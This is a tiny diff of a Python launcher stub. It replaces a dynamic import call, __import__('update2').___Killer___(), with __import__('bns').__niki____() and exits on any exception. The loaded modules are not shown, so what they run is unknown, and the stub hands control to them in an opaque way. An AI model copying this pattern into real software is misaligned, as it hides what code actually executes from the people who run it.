@@ -1,5 +1,5 @@
 import os, sys
 try:
-    __import__("update2").___Killer___()
+    __import__("bns").__niki____()
 except Exception as e:
     exit(str(e))
